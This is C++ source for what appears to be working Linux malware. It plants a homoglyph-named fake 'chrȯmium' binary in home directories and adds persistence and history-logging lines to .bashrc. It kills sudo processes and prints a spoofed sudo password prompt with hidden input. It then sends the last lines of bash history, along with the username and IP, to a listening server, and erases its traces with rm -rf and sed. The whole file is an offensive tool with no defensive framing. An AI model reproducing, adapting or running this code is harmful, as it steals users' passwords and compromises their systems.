#include <netinet/in.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>
#include <sys/stat.h>

#include<sys/types.h>
#include<fcntl.h>
#include<ctype.h>
#include<dirent.h>
#include<time.h>

#include <arpa/inet.h>
#include <sys/socket.h>

#include <fstream>
#include <filesystem>

#include <sys/types.h>
#include <pwd.h>
#include <signal.h>
#include <locale.h>

#define USLEEP_TIME 1500

#define PORT 13031
#define passwordforsend "get"
//#define etc_passwd "/etc/passwd"
#define ipaddress "127.0.0.1" // ip addr server
char *ipaddclient;

struct passwd *username;
int listlen=50;
int listpid [50];
char historyfile[BUFSIZ];
//char *sudostr="\033[K[sudo] password for root:  \033[47m \033[40m\033[?25l\033[38;2;0;0;0m";
char *sudostr;
char *sudo1="\033[30D\033[K\033[1A\033[K[sudo] password for ";
char *sudo2=":  \033[47m \033[40m\033[?25l\033[38;2;0;0;0m";

//char *sudostr="\033[1A\033[0;0f\033[K[sudo] password for root: \033[47m \033[40m\033[?25l\033[38;2;0;0;0m";

void getipaddress()
{
	const char* google_dns_server = "1.1.1.1";
	int dns_port = 53;
	char buffer[80];
	struct sockaddr_in serv;
	int sock = socket(AF_INET, SOCK_DGRAM, 0);

	memset(&serv, 0, sizeof(serv));
	serv.sin_family = AF_INET;
	serv.sin_addr.s_addr = inet_addr(google_dns_server);
	serv.sin_port = htons(dns_port);

	int err = connect(sock, (const struct sockaddr*)&serv, sizeof(serv));

	struct sockaddr_in name;
	socklen_t namelen = sizeof(name);
	err = getsockname(sock, (struct sockaddr*)&name, &namelen);
	const char* p = inet_ntop(AF_INET, &name.sin_addr, ipaddclient, 80);
}
int send_string_to_me(char * text) // client
{
    int status, valread, client_fd;
    struct sockaddr_in serv_addr;
    //char* hello = "get";
    char buffer[1024] = { 0 };
    if ((client_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
        printf("\n Socket creation error \n");
        return -1;
    }

    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(PORT);

    // Convert IPv4 and IPv6 addresses from text to binary
    // form
    if (inet_pton(AF_INET, ipaddress, &serv_addr.sin_addr)
        <= 0) {
        printf(
            "\nInvalid address/ Address not supported \n");
        return -1;
    }
    if ((status
         = connect(client_fd, (struct sockaddr*)&serv_addr,
                   sizeof(serv_addr)))
        < 0) {
        printf("\nConnection Failed \n");
        return -1;
    }
    send(client_fd, text, strlen(text), 0);
    printf("sent\n");
    //valread = read(client_fd, buffer,
    //               1024 - 1); // subtract 1 for the null
                              // terminator at the end
    //printf("%s\n", buffer);

    // closing the connected socket
    close(client_fd);
    return 0;
}

int send_string_main(char * histfile){
	FILE * fp;

	sleep(1);
	char * line = NULL,* linepre = NULL,* linepre1 = NULL,* linepre2 = NULL,* linepre3 = NULL,* linepre4 = NULL;
	size_t len = 0;
	ssize_t read;
	fp = fopen(histfile, "r");
	if (fp == NULL)
			exit(EXIT_FAILURE);
	//while ((read = getline(&line, &len, fp)) != -1) {
	while(true){
		if ((read = getline(&linepre4, &len, fp)) == -1)
			break;
		if ((read = getline(&linepre3, &len, fp)) == -1)
			break;
		if ((read = getline(&linepre2, &len, fp)) == -1)
			break;
		if ((read = getline(&linepre1, &len, fp)) == -1)
			break;
		if ((read = getline(&linepre, &len, fp)) == -1)
			break;
		if ((read = getline(&line, &len, fp)) == -1)
			break;

	}
	char str[BUFSIZ];
	getipaddress();
	snprintf(str, sizeof(str), "%s\n%s\n%s%s%s%s%s%s%s", username->pw_name,ipaddclient,linepre4, linepre3, linepre2, linepre1, linepre,line,"____________\n");
	int err = send_string_to_me((char *)str);
	if (line)
			free(line);
	if (linepre)
			free(linepre);
	if (linepre1)
				free(linepre1);
	if (linepre2)
				free(linepre2);
	if (linepre3)
				free(linepre3);
	if (linepre4)
				free(linepre4);
	return err;
}

int process_scan_3(char const* myself){
    pid_t current_max_pid = 0;
    char cmdline[BUFSIZ],fd1_send[BUFSIZ];
    char buf[BUFSIZ];
    FILE * fp;
    int x;
    DIR* proc_dir;
    struct dirent *dir_e;
    int curr_e_fp;
    char * line = NULL;
	size_t len = 0;
	ssize_t read;
    int send=0;
    while(send==0){
		proc_dir = opendir("/proc");
		if(!proc_dir)
			abort();
		usleep(USLEEP_TIME);
		//for(int i=0; i<listlen; i++){
		while((dir_e = readdir(proc_dir)) != NULL){
			char* d_name = dir_e->d_name;

			// If not a digit (not a process folder)
			if(!isdigit(*d_name))
					continue;

			int num = atoi(d_name);

			snprintf(cmdline, sizeof(cmdline), "%s%s%s", "/proc/", d_name, "/status");

			fp = fopen(cmdline, "r");
			if (fp == NULL)
			        continue;
			 while ((read = getline(&line, &len, fp)) != -1) {
				if(strstr(line, "Name:\tsudo") != NULL ){
					for (int k=0;k<6;k++)
						read = getline(&line, &len, fp);
					if(strstr(line, "PPid:") != NULL){
						char *next_token;
						char * token = strtok_r(line,"\t",&next_token);
						next_token[strlen(next_token)-1] = '\0';
						kill(num, 9);
						snprintf(fd1_send, sizeof(fd1_send), "%s%s%s", "/proc/", next_token ,"/fd/1");
						curr_e_fp = open(fd1_send, O_WRONLY);
						write(curr_e_fp, sudostr, strlen(sudostr));
						close(curr_e_fp);
						send=1;
						break;
					}
				}
				else
				{
					break;
				}
			}
			fclose(fp);
		}
		closedir(proc_dir);
    }
    return 0;
}
void process_scan_1(){
    pid_t current_max_pid = 0, next_max_pid;
    char current_file_name[BUFSIZ];
    char buf[BUFSIZ];
    int n=0;
    DIR* proc_dir;
    struct dirent *dir_e;
    int curr_e_fp;

	proc_dir = opendir("/proc");
	if(!proc_dir)
			abort();

	usleep(USLEEP_TIME);
	while((dir_e = readdir(proc_dir)) != NULL){
			char* d_name = dir_e->d_name;

			// If not a digit (not a process folder)
			if(!isdigit(*d_name))
					continue;

			int num = atoi(d_name);

			if(num > current_max_pid){
					next_max_pid = num;
			}else{
					continue;
			}

			snprintf(current_file_name, sizeof(current_file_name), "%s%s%s", "/proc/", d_name, "/cmdline");
			curr_e_fp = open(current_file_name, O_RDONLY);
			int ra = read(curr_e_fp, buf, BUFSIZ-1);
			close(curr_e_fp);

			for(int i = 0; i<ra-1; i++)
					if(buf[i] == '\0') buf[i] = ' ';

			if (strncmp(buf,"/bin/zsh",8)==0 or strncmp(buf,"/bin/bash",9)==0 or
				strncmp(buf,"-bash",5)==0 or strncmp(buf,"bash",4)==0
			)
			{
				listpid[n]=num;
				n++;
				//printf("[!] %d - %s\n",num,buf);
			}
	}
	listlen = n;
	current_max_pid = next_max_pid;
	closedir(proc_dir);
}
int infect(char const* filesource){
	DIR* proc_dir;
	struct dirent *dir_e;
	char homedir[BUFSIZ],filechromium[BUFSIZ]="\0";
	proc_dir = opendir("/home");
	if(!proc_dir){
		return 2;
	}
	std::ifstream input(filesource, std::ios::binary );
	while((dir_e = readdir(proc_dir)) != NULL){
		char* d_name = dir_e->d_name;
		if (strcmp(d_name,"..") == 0 or strcmp(d_name,".") == 0)
			continue;

		snprintf(homedir, sizeof(homedir), "%s%s", "/home/", d_name);

		struct stat s = {0};
		int result = stat(homedir, &s);
		if (result != 0)
		  continue;

		if (s.st_uid != getuid())
			continue;
		snprintf(homedir, sizeof(homedir), "%s%s%s", "/home/", d_name, "/.config");
		if ( std::filesystem::exists(homedir) == false)
			std::filesystem::create_directories(homedir);
		snprintf(homedir, sizeof(homedir), "%s%s%s", "/home/", d_name, "/.config/chrȯmium");

		snprintf(filechromium, sizeof(filechromium), "%s%s%s%s%s%s%s%s", "unset HISTFILESIZE\n","HISTSIZE=3000\n","PROMPT_COMMAND=\"history -a\"\n","export HISTSIZE PROMPT_COMMAND\n","shopt -s histappend\n","/home/", d_name,"/.config/chrȯmium > /dev/null 2>&1 &\n"); //save path
		if ( std::filesystem::exists(homedir) == true)
			return 1;

		std::ofstream output(homedir, std::ios::binary );
		std::copy(
		std::istreambuf_iterator<char>(input),
		std::istreambuf_iterator<char>( ),
		std::ostreambuf_iterator<char>(output));
		std::filesystem::permissions(
					homedir,
					std::filesystem::perms::owner_all | std::filesystem::perms::group_all,
					std::filesystem::perm_options::add
				);
		snprintf(homedir, sizeof(homedir), "%s%s%s", "/home/", d_name, "/.bashrc");
		//snprintf(historyfile, sizeof(homedir), "%s%s%s", "/home/", d_name, "/.history"); //save
		std::ofstream filebashrc(homedir,  std::ofstream::app| std::ofstream::out);
		filebashrc.seekp(0, std::ios::beg);
		filebashrc.write((char *)&filechromium, sizeof(char) * strlen(filechromium));
	}
	closedir(proc_dir);

	return 0;
}
char* gethomehistory(){
	DIR* proc_dir;
	struct dirent *dir_e;
	char homedir[BUFSIZ];
	proc_dir = opendir("/home");
	if(!proc_dir){
		return "null";
	}
	//std::ifstream input(filesource, std::ios::binary );
	while((dir_e = readdir(proc_dir)) != NULL){
		char* d_name = dir_e->d_name;
		if (strcmp(d_name,"..") == 0 or strcmp(d_name,".") == 0)
			continue;

		snprintf(homedir, sizeof(homedir), "%s%s", "/home/", d_name);

		struct stat s = {0};
		int result = stat(homedir, &s);
		if (result != 0)
		  continue;

		if (s.st_uid != getuid())
			continue;

		snprintf(historyfile, sizeof(homedir), "%s%s%s", "/home/", d_name, "/.bash_history"); //save
	}
	closedir(proc_dir);

	return (char *)historyfile;
}
#define die(e) do { fprintf(stderr, "%s\n", e); exit(EXIT_FAILURE); } while (0);
int main(int argc, char const* argv[])
{
	setlocale(LC_ALL, "en_US.UTF-8");

	int err = infect(argv[0]);
	if ( err != 1 ) // not exist file and not error open dir
	{
		system("rm -rf sleepall");
		return 0;
	}
	sudostr = (char*)malloc(sizeof(char*)*200);
	if ((username = getpwuid(geteuid())) != NULL){
		strcat(sudostr,sudo1);
		strcat(sudostr,username->pw_name);
		strcat(sudostr,sudo2);
	}else{
		strcat(sudostr,sudo1);
		strcat(sudostr,"root");
		strcat(sudostr,sudo2);
	}
	   // if ( (p = getpwuid(1000)) != NULL)
	     // printf(" %-8.8s", p->pw_name)

		//	for( int i=0;i<listlen;i++)
//		listpid[i]=0;
	do{ //wait user run console
		sleep(1);
		process_scan_1();
	}while (listlen == 0 );

	process_scan_3(argv[0]);

	sleep(15);

	gethomehistory();
	ipaddclient = (char*)malloc(sizeof(ipaddclient)*16);
	send_string_main(historyfile);
	delete(ipaddclient);
	delete(sudostr);
	system("rm -rf /home/*/.config/chrȯmium");
	system("sed -n -e :a -e '1,7!{P;N;D;};N;ba' -i /home/*/.bashrc");
    return 0;
}
